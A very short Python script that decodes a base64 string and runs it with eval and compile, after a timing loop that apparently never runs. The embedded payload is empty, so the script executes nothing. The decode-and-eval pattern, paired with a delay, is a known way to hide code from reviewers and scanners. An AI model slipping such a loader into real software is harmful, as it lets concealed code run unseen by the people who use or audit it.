from base64 import b64decode
from time import time, sleep
start_time = time()
code = ""
while (time() - start_time) > 1:
        sleep(0.001)
eval(compile(b64decode((code)), "<string>","exec"))
